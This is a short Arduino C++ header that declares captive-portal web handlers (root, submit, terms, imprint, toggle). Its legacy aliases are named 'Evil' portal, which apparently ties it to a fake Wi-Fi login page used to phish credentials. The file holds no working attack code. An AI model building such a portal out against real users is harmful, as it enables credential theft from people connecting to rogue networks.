#pragma once
#include <Arduino.h>

void initPortalFiles();
void handlePortalRoot();
void handlePortalSubmit();
void handlePortalTOS();
void handlePortalImprint();
void togglePortalServer();

// Abwärtskompatible Aliase
inline void handleEvilRoot() { handlePortalRoot(); }
inline void handleEvilSubmit() { handlePortalSubmit(); }
inline void handleEvilTOS() { handlePortalTOS(); }
inline void handleEvilImprint() { handlePortalImprint(); }
inline void toggleEvilPortal() { togglePortalServer(); }

